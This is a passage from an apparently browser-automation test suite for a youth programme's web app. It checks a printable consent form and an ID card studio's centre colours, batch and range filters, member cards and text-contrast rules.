        optionalTags: count(filled, /class="tag opt"/g),
        sigImage: /<img class="sigimg" src="data:image\/png;base64,AAAA"/.test(filled),
        sigName: filled.includes('MRS OKONKWO'),
        sigDate: filled.includes('2026-07-27'),
        // The blank pad must NOT carry a specific parent's signature.
        blankSig: /<img class="sigimg"/.test(blank),
      };
    });
    await cf.close();

    ok('the consent form carries all seven clauses (' + form.clauses + ')', form.clauses === 7);
    // 3 required to grant + 2 required to answer + 2 genuinely optional.
    ok('…three required to grant, two to answer, two optional',
       form.required === 3 && form.answerRequired === 2 && form.optional === 2);
    ok('…each with consent / do-not-consent boxes (' + form.boxes + ')', form.boxes === 14);
    ok('…prefilled with the child on file', form.hasName);
    ok('…with markup in a name escaped, not rendered', form.escaped);
    ok('…and quotes in a guardian name escaped', form.quoteEscaped);
    ok('…a data protection notice citing the NDPA 2023', form.ndpa);
    ok('…the safeguarding basis in the Child’s Rights Act 2003', form.childRights);
    ok('…the right to withdraw consent, stated plainly', form.withdrawal);
    ok('…and clause 5 separating taking a photo from publishing it', form.photoGate);
    ok('…signature, witness and child-assent blocks (' + form.signatures + ' rules)', form.signatures >= 7);
    ok('…an office-use panel for the receiving centre', form.officeUse);
    ok('…laid out for A4', form.a4);
    ok('the blank form keeps every clause', form.blankClauses === 7);
    ok('…drops the child’s details', !form.blankHasName);
    ok('…and leaves ruled lines to write on', form.blankHasRules);
    ok('…and never carries a parent\'s captured signature', !form.blankSig);

    // Logo + the parts an organisation owns.
    ok('the form carries the programme logo', form.logo);
    ok('…the registered legal name and RC number', form.orgName && form.rc);
    ok('…the admin-set form reference and revision', form.formRef);
    ok('…the admin-set retention period, not a hardcoded one', form.retention);
    ok('…the data protection contact a parent can write to', form.dpo);
    ok('…and an extra clause the organisation added (now 8)', form.extraClause && form.clausesWithExtra === 8);

    // Clauses 4 and 5 must be ANSWERED, not granted.
    ok('clauses 4 and 5 are marked answer-required, not optional', form.answerRequired === 2);
    ok('…leaving off-site activities and updates genuinely optional', form.optionalTags === 2);

    // A captured signature is what makes the printed record evidence.
    ok('a captured signature is printed on the record', form.sigImage);
    ok('…with the name signed under and the date', form.sigName && form.sigDate);

    // ── ID Card Studio: mounts with its print controls intact ──────────────
    const studio = await browser.newPage();
    const studioErrs = [];
    studio.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) studioErrs.push(m.text()); });
    studio.on('pageerror', e => studioErrs.push(String(e.message)));
    await studio.goto(BASE + '/tests/_boards_fixture.html?board=cards&mode=ok', { waitUntil: 'networkidle' });
    await studio.waitForTimeout(900);
    const sErrs = await studio.evaluate(() => window.__errors);
    ok('/cards studio mounts with no script error', sErrs.length === 0 && studioErrs.length === 0);
    if (sErrs.length || studioErrs.length) console.error('       ', sErrs.concat(studioErrs).slice(0, 3).join(' | '));
    // The studio is the pre-existing one: every card drawn, per-card download,
    // and the bulk PNG/PDF exports. The checks kept here are the durable ones —
    // that it mounts, draws the WHOLE roster, and that a malformed record costs
    // its own card rather than blanking the page.
    const cardCount = await studio.locator('.card-pair').count();
    ok('/cards draws every card in the roster (' + cardCount + ' of 30)', cardCount === 30);
    const faces = await studio.locator('.idcard').count();
    ok('/cards survives a record with no centre (' + faces + ' faces drawn)', faces >= 58);
    const body = await studio.evaluate(() => document.body.innerText);
    ok('/cards is not blank', body.trim().length > 200 && /verified participant/.test(body));
    ok('/cards offers the bulk exports', /PNG \(all, \.zip\)/.test(body) && /Print-ready PDF/.test(body));

    /* ── Centre identity on the printed card ────────────────────────────────
     * Reported from the field: "there is no way to identify the volunteers per
     * centre." Neither card carried the site at all — a coordinator at a hall
     * with forty lanyards could not tell who was theirs.
     *
     * Both cards now say it twice: a colour you can find across a room, and a
     * two-letter CODE + the centre NAME you can read in the hand. Colour is
     * checked, but colour is never what the assertion RESTS on — one man in
     * twelve cannot read red against green, print colour drifts between
     * batches, and a photocopy has none of it.
     */
    const centreOnCard = (sel) => studio.evaluate((s) => {
      const cards = Array.from(document.querySelectorAll(s));
      const hex = (c) => {
        const m = String(c).match(/\d+/g);
        return m ? '#' + m.slice(0, 3).map(n => (+n).toString(16).padStart(2, '0')).join('') : '';
      };
      /* The band is the widest solid-coloured box at the foot of a card. The
         height ceiling is 0.16 of the card, not 0.12: the volunteer band is 112
         units of 920 (13.7% of the DEFAULT 54×75 proportion), so the old bound
         found the student's 28-unit band and silently reported "no band" on every
         volunteer card — which an assertion would have read as a pass. */
      const band = (card) => {
        const r = card.getBoundingClientRect();
        return Array.from(card.querySelectorAll('div')).filter(d => {
          const b = d.getBoundingClientRect(), bg = getComputedStyle(d).backgroundColor;
          return b.width > r.width * 0.55 && b.height > 4 && b.height < r.height * 0.16
            && b.bottom > r.bottom - r.height * 0.14 && /^rgb\(/.test(bg)
            && bg !== 'rgb(255, 255, 255)';
        }).sort((a, z) => z.getBoundingClientRect().width - a.getBoundingClientRect().width)[0];
      };
      /* The white panel the volunteer card's frame surrounds. Measuring the
         band against THIS, not against the card, is what tells you whether a
         hairline of white survives between the band and the coloured frame. */
      const panel = (card) => {
        const r = card.getBoundingClientRect();
        return Array.from(card.querySelectorAll('div')).filter(d => {
          const b = d.getBoundingClientRect();
          return getComputedStyle(d).backgroundColor === 'rgb(255, 255, 255)'
            && b.width > r.width * 0.8 && b.height > r.height * 0.8;
        })[0];
      };
      return cards.map(card => {
        const bd = band(card), pn = panel(card);
        const bb = bd && bd.getBoundingClientRect(), pb = pn && pn.getBoundingClientRect();
        // The band's own text, so "is this legible on that colour" is
        // answerable rather than assumed.
        const bandSpan = bd && bd.querySelector('span');
        const bs = bandSpan && getComputedStyle(bandSpan);
        return { text: card.innerText.replace(/\s+/g, ' ').trim(),
                 band: bd ? bd.innerText.trim() : '',
                 bandColor: bd ? hex(getComputedStyle(bd).backgroundColor) : '',
                 bandInk: bs ? hex(bs.color) : '',
                 bandShadow: bs ? bs.textShadow : '',
                 bandFontPx: bs ? Math.round(parseFloat(bs.fontSize) * 100) / 100 : 0,
                 bandOutline: bd ? getComputedStyle(bd).outlineStyle : '',
                 frame: hex(getComputedStyle(card).backgroundColor),
                 /* The volunteer card's centre device, which is no longer a foot
                    band: a thin line in the centre colour round the inside of the
                    white panel, plus the centre name in plain type with a dot of
                    the colour beside it. A band is a solid block at ONE edge —
                    the edge a lanyard sleeve covers and the edge that gets tucked
                    under on a table. A line is on all four. */
                 /* The volunteer card's centre device is the card BACKGROUND —
                    which is the frame on all four edges — continuing into the
                    foot band. So a plain panel is the thing to check: an inset
                    ring on it would mean the old centre-coloured outline, or a
                    keyline, was still being drawn. */
                 panelRings: pn ? (getComputedStyle(pn).boxShadow.match(/inset/g) || []).length : 0,
                 // One line, or two when the code and name cannot share one.
                 bandLines: bd ? bd.innerText.trim().split('\n').filter(Boolean).length : 0,
                 /* The role pill: the only other place the TIER colour appears,
                    and it sits fully inside the white panel so it never meets the
                    centre colour. Found by shape — a hug-width rounded box in a
                    solid colour — rather than by position. */
                 pill: (function () {
                   const r = card.getBoundingClientRect();
                   const el = Array.from(card.querySelectorAll('div')).filter(d => {
                     const b = d.getBoundingClientRect(), st = getComputedStyle(d);
                     return b.height > 8 && b.height < r.height * 0.09 && b.width < r.width * 0.9
                       && b.width > b.height && parseFloat(st.borderRadius) >= b.height / 2 - 1
                       && /^rgb\(/.test(st.backgroundColor) && st.backgroundColor !== 'rgb(255, 255, 255)'
                       && d.innerText.trim().length > 0;
                   })[0];
                   const sp = el && el.querySelector('span');
                   return { text: el ? el.innerText.trim() : '',
                            color: el ? hex(getComputedStyle(el).backgroundColor) : '',
                            ink: sp ? hex(getComputedStyle(sp).color) : '',
                            fontPx: sp ? Math.round(parseFloat(getComputedStyle(sp).fontSize) * 100) / 100 : 0 };
                 })(),
                 /* The credential footer, read as label → value pairs. A blank
                    "VALID TO" row is a different failure from a missing one, and
                    only reading the pairs can tell them apart. */
                 credential: (function () {
                   const out = {};
                   Array.from(card.querySelectorAll('span')).forEach(s => {
                     const t = s.innerText.trim();
                     if (!/^(VOLUNTEER ID|VALID TO)$/i.test(t)) return;
                     const v = s.nextElementSibling;
                     out[t.toUpperCase()] = v ? v.innerText.trim() : '';
                   });
                   return out;
                 })(),
                 // Smallest white margin between the band and the panel edge on
                 // the three sides that face the frame. null when there is no
                 // inner panel at all (the student card is one white plane).
                 gutter: bb && pb
                   ? Math.round(Math.min(bb.left - pb.left, pb.right - bb.right, pb.bottom - bb.bottom))
                   : null };
      });
    }, sel);

    const stuFronts = (await centreOnCard('.card-pair .idcard')).filter((_, i) => i % 2 === 0);
    ok('every student card names its centre in a band (' + stuFronts.filter(c => c.band).length + '/30)',
      stuFronts.length === 30 && stuFronts.filter(c => /^(IJAIYE|EGBEDA)$/i.test(c.band)).length === 29);
    ok('…in that centre\'s own colour, so two sites never look alike',
      new Set(stuFronts.filter(c => c.band).map(c => c.bandColor)).size === 2);
    ok('…and the code is set into the photo ring, because colour is not a label',
      stuFronts.filter(c => /\bIJ\b/.test(c.text) || /\bEG\b/.test(c.text)).length === 29);
    ok('…while the record with no centre still draws a card',
      stuFronts.filter(c => !c.band).length === 1);

    /* ── The batch filter, and the one filter the centre list cannot give you ─
     * Cards are handed out per site, so the studio has to be able to print one
     * site's batch. The reason it exists, though, is the option a list of
     * centres can never contain: the records that have NO centre. Those print
     * a plain frame with no ring, no code and no band, and until now you found
     * that out at the guillotine with the run already cut.
     */
    const batch = studio.getByLabel('Filter cards by centre');
    const batchOpts = await batch.locator('option').allInnerTexts();
    ok('the studio can print one centre\'s batch (' + batchOpts.length + ' options)',
      batchOpts.some(o => /^Egbeda · 15$/.test(o)) && batchOpts.some(o => /^Ijaiye · 14$/.test(o)));
    ok('…and offers the one option a list of centres cannot, with its count',
      batchOpts.some(o => /No centre on file · 1$/.test(o)));
    /* Surfaced whether or not you went looking. A warning you only see after
       you have already found the problem is not a warning. */
    ok('…flagged on the toolbar without opening the picker',
      (await studio.getByRole('button', { name: /1 with no centre/ }).count()) === 1);

    await batch.selectOption({ label: 'Egbeda · 15' });
    await studio.waitForTimeout(500);
    ok('picking a centre narrows the run to that batch (' + (await studio.locator('.card-pair').count()) + ')',
      (await studio.locator('.card-pair').count()) === 15);
    /* The count in the header is what somebody reads before hitting Print, so
       it has to say it is a subset — "14 students ready" next to a 30-strong
       roster is how a partial run gets sent to a printer. */
    ok('…and the header says it is a subset, not the whole roster',
      /15 of 30 verified participants ready/.test(await studio.evaluate(() => document.body.innerText)));

    await batch.selectOption({ label: '⚠ No centre on file · 1' });
    await studio.waitForTimeout(500);
    const noneText = await studio.evaluate(() => document.body.innerText);
    ok('the missing-centre filter finds exactly the record with none',
      (await studio.locator('.card-pair').count()) === 1 && /NAME13/.test(noneText));
    ok('…and says what will print and where to fix it',
      /prints without a centre/i.test(noneText) && /Admin → Summer/.test(noneText));
    /* Both of these read wrong at a count of one, and one is exactly the count
       you hit when a batch is nearly clean — the moment somebody is most
       likely to be reading the screen for reassurance. */
    ok('…in a sentence that survives a count of one',
      /1 of 30 verified participants ready/.test(noneText) && /This card prints without a centre/.test(noneText));

    /* ── The studio's THIRD subject: NGG members ─────────────────────────────
       Members had no studio. They were printed from a drawer inside the member
       roster — the same job, in a different place, through different code —
       while participants and volunteers shared this screen. What made a third
       subject impossible was `isVol`, a boolean threaded through some
       twenty-five sites, each re-deciding what a volunteer is and what a
       student is. It is a subject table now (CARD_SUBJECTS), and these checks
       are what say the third row of it actually renders rather than merely
       existing. */
    await studio.click('button:has-text("NGG members")');
    await studio.waitForTimeout(700);
    const memText = await studio.evaluate(() => document.body.innerText);
    const memCards = await studio.locator('.card-pair').count();
    ok('the studio has a third tab and it draws member cards (' + memCards + ' of 3)', memCards === 3);
    ok('…counted as members, not as participants',
      /3 members ready/.test(memText) && !/participants ready/.test(memText));
    /* "SCAN TO VERIFY" appears in exactly one place in the codebase —
       NggcMemberCard, the card a member downloads from their own dashboard and
       the one NggcMemberCardExport prints. Its presence here is the proof that
       the studio ADAPTED that renderer rather than growing a second drawing of
       the member card in this file's own idiom, which would have drifted from
       the shipped one within a season. */
    ok('…rendering the SHIPPED member card, not a second drawing of it',
      /SCAN TO VERIFY/i.test(memText));
    /* The blank this whole subject exposed: card_row_member falls back to the
       internal memberId when no printed ID is assigned, which keeps the card
       from printing blank and hid the problem — the member roster filters and
       counts exactly these people. The row carries displayIdMissing now. */
    ok('…and a member with no printed ID assigned is named as such, not silently printed',
      memText.indexOf('NGG-2026-0003') !== -1);
    /* The member card is ID-1 and its trim is NOT the Summer School
       programme's setting. Reading the programme for every subject had the
       export blurb promising an exact 54×75 trim for a card that prints at
       54×85, and the preview was scaled from the same wrong ratio — so the
       studio described a card it was not producing. */
    ok('…the member card states its own ID-1 trim, not the programme trim',
      /54\s*[×x]\s*85/.test(memText) && !/exact 54×75 mm trim/.test(memText));
    ok('…and the trim control says it does not govern this card, and is inert',
      /NOT USED BY THIS CARD/i.test(memText)
      && (await studio.locator('button:has-text("Save size")').isDisabled()));
    /* No resend for members — they issue their own card from the member
       dashboard — so the button must be absent rather than dead. */
    ok('…with no dead Resend ID control on a subject that has no resend op',
      (await studio.locator('button:has-text("Resend ID")').count()) === 0);

    /* Switching back must restore the participant view intact: the subject
       table swap replaced two useState objects with one keyed store, and a
       stale key there would show one subject's cards under another's heading. */
    await studio.click('button:has-text("Participants")');
    await studio.waitForTimeout(700);
    const backText = await studio.evaluate(() => document.body.innerText);
    ok('…and going back to Participants restores that subject, not a mixture',
      /30 verified participants ready/.test(backText)
      && (await studio.locator('.card-pair').count()) === 30);

    /* ── Printing a RANGE, not the roster ────────────────────────────────────
     * "Everybody" is the rarest print run there is. The real ones are: the
     * children who registered since the last batch went to the printer, the
     * block of ID numbers a coordinator was handed, and the eleven cards that
     * came back creased. With no way to say any of that, the only honest option
     * was to reprint all thirty — so people reprinted all thirty, and the cost
     * of that is paid in card stock.
     */
    await batch.selectOption({ label: 'All centres · 30' });
    await studio.waitForTimeout(400);
    const rangeSel = studio.getByLabel('Print a range of cards');

    await rangeSel.selectOption('date');
    await studio.getByLabel('Registered from').fill('2026-07-02');
    await studio.getByLabel('Registered to').fill('2026-07-06');
    await studio.waitForTimeout(500);
    ok('a run can be cut by registration date (' + (await studio.locator('.card-pair').count()) + ')',
      (await studio.locator('.card-pair').count()) === 7);
    const dateText = await studio.evaluate(() => document.body.innerText);
    ok('…and the header counts the slice against the batch, not the roster',
      /Printing 7 of 30/.test(dateText) && /7 of 30 verified participants ready/.test(dateText));
    /* The card with no date is left OUT of a date range and SAID so. Sweeping it
       in would make "print this week's intake" quietly reprint the oldest record
       in the system; dropping it silently would lose a child a card. */
    ok('…a card with no registration date is excluded, and the omission is named',
      /no registration date on file/.test(dateText) && /\b1 card has\b/.test(dateText));

    // A range that matches nothing must not look like an empty roster.
    await studio.getByLabel('Registered from').fill('2027-01-01');
    await studio.getByLabel('Registered to').fill('2027-01-02');
    await studio.waitForTimeout(450);
    ok('…and a range matching nothing says so rather than looking like an empty roster',
      (await studio.locator('.card-pair').count()) === 0
      && /Nothing matches this range/.test(await studio.evaluate(() => document.body.innerText)));

    await rangeSel.selectOption('number');
    await studio.getByLabel('ID number from').fill('5');
    await studio.getByLabel('ID number to').fill('9');
    await studio.waitForTimeout(500);
    const numText = await studio.evaluate(() => document.body.innerText);
    ok('a run can be cut by the ID number printed on the card (' + (await studio.locator('.card-pair').count()) + ')',
      (await studio.locator('.card-pair').count()) === 5 && /Printing 5 of 30/.test(numText));
    /* Read off the printed number, not the row's position — which shifts every
       time somebody else registers, so "cards 5 to 9" would mean something
       different on Tuesday. */
    ok('…matching the number in the ID, not the position in the list',
      /NGG\/26\/0005/.test(numText) && /NGG\/26\/0009/.test(numText)
      && !/NGG\/26\/0004/.test(numText) && !/NGG\/26\/0010/.test(numText));
    // Switching mode must not leave the previous range half-applied.
    await rangeSel.selectOption('date');
    await studio.waitForTimeout(400);
    ok('…and switching range mode clears the previous one instead of stacking',
      (await studio.locator('.card-pair').count()) === 30);

    await rangeSel.selectOption('pick');
    await studio.waitForTimeout(500);
    /* Every candidate stays on screen while picking. A list that removed each
       card as it was ticked would let you choose exactly one. */
    ok('picking individually keeps every candidate visible to pick from',
      (await studio.locator('.card-pair').count()) === 30
      && (await studio.locator('.card-pair.card-unpicked').count()) === 30);
    await studio.getByLabel('Print NGG/26/0003').check();
    await studio.getByLabel('Print NGG/26/0007').check();
    await studio.waitForTimeout(400);
    ok('…and the run is what was ticked (' + (await studio.locator('.card-pair:not(.card-unpicked)').count()) + ')',
      (await studio.locator('.card-pair:not(.card-unpicked)').count()) === 2
      && (await studio.locator('.card-pair.card-unpicked').count()) === 28
      && /2 picked/.test(await studio.evaluate(() => document.body.innerText)));
    /* And the unticked ones must be GONE from the sheet, not faded on it.
       Dimming is a screen affordance; printed at 34% opacity it is still a
       thirty-card run on thirty pieces of card. */
    ok('…with the unticked cards dropped from the print sheet, not dimmed on it',
      (await studio.evaluate(() => {
        const el = document.querySelector('.card-pair.card-unpicked');
        return el ? [...document.styleSheets].some(sh => {
          try { return [...sh.cssRules].some(r => /card-unpicked/.test(r.cssText) && /display:\s*none/.test(r.cssText)); }
          catch (_) { return false; }
        }) : false;
      })) === true);
    /* The list of IDs arrives as a message, not as a mental note. Pasting it
       beats hunting two hundred previews for twelve, and it has to survive the
       formatting a WhatsApp message applies to it. */
    await studio.getByLabel('Paste card IDs').fill('ngg/26/0011  NGG-26-0012, 13');
    await studio.getByRole('button', { name: 'Add these' }).click();
    await studio.waitForTimeout(450);
    ok('…or pasted in, untidy separators and all',
      (await studio.locator('.card-pair:not(.card-unpicked)').count()) === 5
      && /3 matched/.test(await studio.evaluate(() => document.body.innerText)));
    // An ID that is not in this batch has to be reported, not quietly dropped.
    await studio.getByLabel('Paste card IDs').fill('NGG/26/0999');
    await studio.getByRole('button', { name: 'Add these' }).click();
    await studio.waitForTimeout(450);
    ok('…and an ID that is not in the batch is named rather than silently ignored',
      /not in this batch: NGG260999/.test(await studio.evaluate(() => document.body.innerText))
      && (await studio.locator('.card-pair:not(.card-unpicked)').count()) === 5);
    await rangeSel.selectOption('');
    await studio.waitForTimeout(400);

    await studio.getByRole('button', { name: /^Volunteers/ }).click();
    await studio.waitForTimeout(700);
    /* The filter belongs to the batch on the table. Carrying "no centre" over
       to a different roster would silently hide two of the three volunteers,
       and the header would still read as if that were everybody. */
    ok('switching roster clears the filter rather than carrying it over',
      (await studio.locator('.card-pair').count()) === 5
      && !/of 5 volunteers ready/.test(await studio.evaluate(() => document.body.innerText)));
    const volFronts = (await centreOnCard('.card-pair .idcard')).filter((_, i) => i % 2 === 0);
    /* Two admin-picked colours, four places, and they never meet. The CENTRE
       colour is the card background — which is the frame on all four edges — and
       the foot band the frame runs into. The TIER colour is the disc and the role
       pill, both fully inside the white panel. */
    ok('the volunteer card frames itself in its centre colour (' + volFronts.length + ' cards)',
      volFronts.length === 5 && volFronts[0].frame === '#d64545' && volFronts[1].frame === '#2e7dd1'
      && volFronts[3].frame === '#f7e36b');
    ok('…and the foot band is the same colour, because it is the same shape',
      volFronts[0].bandColor === '#d64545' && volFronts[1].bandColor === '#2e7dd1'
      && volFronts[3].bandColor === '#f7e36b');
    /* Colour is not a label — one man in twelve cannot read it, print drifts
       between batches, and a photocopy has none of it — so the band spells the
       centre out, code first, which is what a coordinator calls across a hall. */
    ok('…with the code and the centre written out on it',
      /^EG\b/.test(volFronts[0].band) && /EGBEDA$/.test(volFronts[0].band)
      && /^IJ\b/.test(volFronts[1].band) && /IJAIYE$/.test(volFronts[1].band));
    /* The band ink is chosen from the colour underneath it, which is the whole
       reason cardInk exists: the pale yellow centre used to print white on
       near-white, and nobody found out until the box arrived. */
    ok('…in ink the colour can actually carry, dark on a pale centre',
      volFronts[3].bandInk === '#10131a' && volFronts[3].bandShadow === 'none'
      && volFronts[0].bandInk === '#ffffff');
    /* The role, which is the other thing a volunteer gets stopped and asked
       about, in the tier colour — inside the panel, never touching the frame. */
    ok('the role is a pill in the tier colour, inside the white panel',
      volFronts[0].pill.text === 'LEAD MENTOR' && volFronts[0].pill.color === '#8a1538'
      && volFronts[1].pill.text === 'MENTOR' && volFronts[1].pill.color === '#00225f');
    // "INSTRUCTOR" alone identifies nobody where every third person is one.
    ok('…qualified by faculty when there is one, and with no trailing dot when not',
      volFronts[3].pill.text === 'INSTRUCTOR · MUSIC' && !/·/.test(volFronts[1].pill.text));
    /* Nothing on the card is adjacent any more, so the conditional keyline and
       the panel's centre-coloured outline are both gone. An inset ring on the
       panel would mean one of them is still firing. */
    ok('…and the panel is plain white, with no keyline or outline left on it',
      volFronts.every(c => c.panelRings === 0));
    /* The case that used to need the keyline: a centre colour EQUAL to the tier
       colour. Legal, and now simply correct — the two never touch, so there is
       nothing to hold apart. */
    ok('…so a centre colour equal to the tier colour renders like any other card',
      volFronts[4].frame === '#0a2a6e' && volFronts[4].pill.color === '#0a2a6e'
      && volFronts[4].panelRings === 0);
    /* A volunteer with no single site — a roving mentor, ops, a record filed
       before centres existed — used to get nothing at all, which left two
       different card geometries in one print run. A card with a gap where every
       other card has a colour reads as a misprint, not as "works everywhere". */
    ok('a volunteer with no single centre gets the programme mark, not a hole',
      /OLD/.test(volFronts[2].text) && volFronts[2].frame === '#1b2b6b'
      && volFronts[2].bandColor === '#1b2b6b' && /ALL CENTRES$/.test(volFronts[2].band));
    /* The band spans the full 590 units, not the content gutter, so it has 520 to
       work with — and below its floor the answer is a second line, not smaller
       type. With a fixed track and a base·0.5 floor this name solved to 13 units:
       about 1.1mm, under 4pt, the smallest type on the card. */
    ok('a centre name too long for one band line splits, rather than shrinking to 4pt',
      volFronts[4].bandLines === 2 && /^IEC/.test(volFronts[4].band)
      && /IKOTUN-EGBE COMMUNITY HALL$/.test(volFronts[4].band)
      && volFronts[4].bandFontPx >= volFronts[1].bandFontPx * 0.85);
    ok('…while every name that does fit stays on one line',
      [0, 1, 2, 3].every(i => volFronts[i].bandLines === 1));
    /* The credential footer. A blank VALID TO row is a different failure from an
       absent one, so both are asserted: the date when there is one, and nothing
       at all for a programme running with no expiry. */
    ok('the card carries its ID and its expiry where a desk can read them',
      volFronts[0].credential['VOLUNTEER ID'] === 'VOL-MEN-26-001'
      && volFronts[0].credential['VALID TO'] === '2026-10-29');
    ok('…and no expiry means no row, not a blank one',
      volFronts[2].credential['VOLUNTEER ID'] === 'VOL-MEN-26-003'
      && !('VALID TO' in volFronts[2].credential));
    /* The rules themselves, not their shadow on the pixels. */
    const rules = await studio.evaluate(() => {
      const id = n => n, W = 496;
      const f = (name, avail) => window.centreBandFont(name, 26, id, avail || W);
      const width = (name, avail) => {
        const r = f(name, avail);
        return name.length * (0.62 * r.fontSize + r.letterSpacing);
      };
      return {
        short: f('Egbeda').fontSize,
        long: f('Ikotun-Egbe Community Hall').fontSize,
        longFits: width('Ikotun-Egbe Community Hall') <= W,
        absurd: f('Ago-Palace Way Learning Centre Annexe B').fontSize,
        absurdFits: width('Ago-Palace Way Learning Centre Annexe B') <= W,
        floor: 26 * 0.55,
        clashRedMaroon: window.cardColorsClash('#D64545', '#8A1538'),
        clashNavies: window.cardColorsClash('#0A2A6E', '#00225F'),
        clashBlueNavy: window.cardColorsClash('#2E7DD1', '#00225F'),
        clashYellowNavy: window.cardColorsClash('#F7E36B', '#00225F'),
        sameList: window.colourNeighbours('#D64545', [{ name: 'Egbeda', color: '#D64545' }, { name: 'Ikeja', color: '#D94A4A' }]),
        clear: window.colourNeighbours('#12A150', [{ name: 'Egbeda', color: '#D64545' }]),
        /* The foot band's own solve, in design units. 520 is the full card width
           less its 35-unit clearance — the band is NOT inside the content
           gutter, which is exactly the mistake that produced 13-unit type. */
        bandShort: window.footBandFit('EG  ·  EGBEDA', 520, 25, 22),
        bandLong: window.footBandFit('IEC  ·  IKOTUN-EGBE COMMUNITY HALL', 520, 25, 22),
        bandSplitName: window.footBandFit('IKOTUN-EGBE COMMUNITY HALL', 520, 23, 18),
        // …and the one-line solve the names and the pill share.
        fitShort: window.cardFit('Bakare', 50, 424),
        fitLong: window.cardFit('Oyelaran-Oyeyinka', 50, 424),
        fitPill: window.cardFit('INSTRUCTOR · CREATIVE WRITING', 18, 360, 3.2),
      };
    });
    ok('a centre name is sized from the space available, not a magic character count',
      rules.short === 26 && rules.long === 26 && rules.longFits);
    ok('…and a name that genuinely cannot fit shrinks, with a floor',
      rules.absurd < 26 && rules.absurd >= rules.floor && rules.absurdFits);
    ok('the clash test catches the pair that caused this, not just identical colours',
      rules.clashRedMaroon === true && rules.clashNavies === true
      && rules.clashBlueNavy === false && rules.clashYellowNavy === false);
    /* Said at the picker, where the fix is one click rather than a reprint. Only
       ONE direction is a collision now: two centres (or two tiers) that look
       alike defeat the device outright. A centre colour close to a TIER colour
       used to be warned about because the two touched on the card; they no
       longer do, and warning about a pairing that renders perfectly well would
       send an admin off to change a colour for no reason. */
    ok('a colliding colour is named at the picker',
      rules.sameList.length === 1 && rules.sameList[0].name === 'Ikeja' && rules.sameList[0].sameList === true
      && rules.clear.length === 0);
    // Editing a centre must not report that it is too close to itself.
    ok('…and a colour is never flagged against the row that already holds it',
      (await studio.evaluate(() => window.colourNeighbours('#D64545', [{ name: 'Egbeda', color: '#d64545' }]).length)) === 0);
    /* The band's solve, as a rule. A short line sits at the base size; a long one
       comes down but never below the floor, and asks to be split instead. */
    ok('the foot band sizes from 520 units, and asks for a second line at its floor',
      rules.bandShort.size === 25 && rules.bandShort.split === false
      && rules.bandShort.track === 5
      && rules.bandLong.split === true && rules.bandLong.size === 22
      && rules.bandSplitName.split === false && rules.bandSplitName.size > 18);
    // Never above base, and the fitted size must actually fit the width given.
    ok('…and the one-line solve caps at base, then shrinks only as much as it must',
      rules.fitShort === 50 && rules.fitLong < 50
      && Math.abs(17 * 0.62 * rules.fitLong - 424) < 1
      && rules.fitPill < 18 && 29 * (0.62 * rules.fitPill + 3.2) <= 360.5);
    /* ── Ink that a background can carry, everywhere and not just on the card ──
     * The card reads its own colours; the screen surfaces built on the SAME
     * admin-picked colours — centre rings, channel chips, ranked centre badges —
     * were hard-coded white with a drop shadow. The shadow was doing the arguing:
     * it does not rescue white text on a pale colour, it smudges it. The rule now
     * lives in one place, so print and screen cannot disagree about when a colour
     * is pale.
     */
    const ink = await studio.evaluate(() => ({
      navy: window.inkOn('#00225F'),
      paleCentre: window.inkOn('#F7E36B'),
      gold: window.inkOn('#f5b026'),
      junk: window.inkOn('teal'),
      short: window.inkOn('#fff'),
      // One function, not two copies: the card delegates to it.
      sameAsCard: JSON.stringify(window.inkOn('#F7E36B')) === JSON.stringify(window.cardInk('#F7E36B')),
      /* And the change is load-bearing, not theoretical: this is the avatar
         palette the community and the leaderboard actually ship, and these many
         of its entries cannot carry white text. */
      lightInAvatarPalette: ['#f5b026', '#b07cff', '#2f9e44', '#3b5bdb', '#ff5a3c', '#17a2b8', '#e8a92b', '#6a3fc0']
        .filter(c => window.inkOn(c).light).length,
    }));
    ok('one ink rule serves both the printed card and the screen',
      ink.sameAsCard === true && ink.navy.ink === '#fff' && ink.paleCentre.ink === '#10131a');
    ok('…with no shadow under dark ink, because a shadow there is just smudge',
      ink.paleCentre.shadow === 'none' && ink.navy.shadow !== 'none');
    ok('…a three-digit hex is read like a six-digit one, and junk falls back to white',
      ink.short.light === true && ink.junk.ink === '#fff' && ink.junk.light === false);
    ok('…and it is load-bearing: ' + ink.lightInAvatarPalette + ' of 8 shipped avatar colours cannot carry white',
      ink.lightInAvatarPalette >= 2);
    // Same filter, same problem, the other roster.
    await studio.getByLabel('Filter cards by centre').selectOption({ label: '⚠ No centre on file · 1' });
    await studio.waitForTimeout(500);
    const volNone = await studio.evaluate(() => document.body.innerText);
    ok('the missing-centre filter works on volunteers too',
      (await studio.locator('.card-pair').count()) === 1 && /OLD/.test(volNone));
    ok('…pointing at where a volunteer\'s centre is actually set',
      /Admin → Volunteers/.test(volNone));
    await studio.close();

    /* ── …and the same filter where the centre can actually be SET ───────────
     * The studio can only show you the problem. Admin → Volunteers → Roster is
     * where it gets fixed, so the filter has to exist at both ends — finding
     * eleven cards with no centre is not much use if the only way to work out
     * WHICH eleven people they are is to read the roster line by line.
     */
    const vp = await browser.newPage();
    const vpErrs = [];
    vp.on('pageerror', e => vpErrs.push(String(e.message)));
    await vp.goto(BASE + '/tests/_boards_fixture.html?board=vols&mode=ok', { waitUntil: 'networkidle' });
    await vp.waitForTimeout(800);
    await vp.getByRole('button', { name: /^Roster/ }).click();
    await vp.waitForTimeout(400);
    ok('the volunteer roster mounts with no script error', vpErrs.length === 0);
    if (vpErrs.length) console.error('       ', vpErrs.slice(0, 2).join(' | '));
    const vSel = vp.getByLabel('Filter volunteers by centre');
    const vOpts = await vSel.locator('option').allInnerTexts();
    ok('the roster filters by centre, counted (' + vOpts.length + ' options)',
      vOpts.some(o => /^Egbeda · 2$/.test(o)) && vOpts.some(o => /^Ijaiye · 1$/.test(o)));
    /* Two records, one holding null and one holding an empty string. A filter
       written against only one of those shapes finds one volunteer and reports
       it as if that were all of them. */
    ok('…and counts both shapes of "no centre" as the same problem',
      vOpts.some(o => /No centre on file · 2$/.test(o)));
    ok('…flagged without opening the picker',
      (await vp.getByRole('button', { name: /2 with no centre/ }).count()) === 1);

    await vp.getByRole('button', { name: /2 with no centre/ }).click();
    await vp.waitForTimeout(300);
    const vText = await vp.evaluate(() => document.body.innerText);
    ok('one click lists exactly the volunteers with no centre',
      /Old Record/.test(vText) && /Older Record/.test(vText) && !/Tunde Bakare/.test(vText));
    ok('…saying what it costs them, not just that a field is blank',
      /missing from every per-centre count/.test(vText) && /prints with no centre/.test(vText));

    await vSel.selectOption({ label: 'Egbeda · 2' });
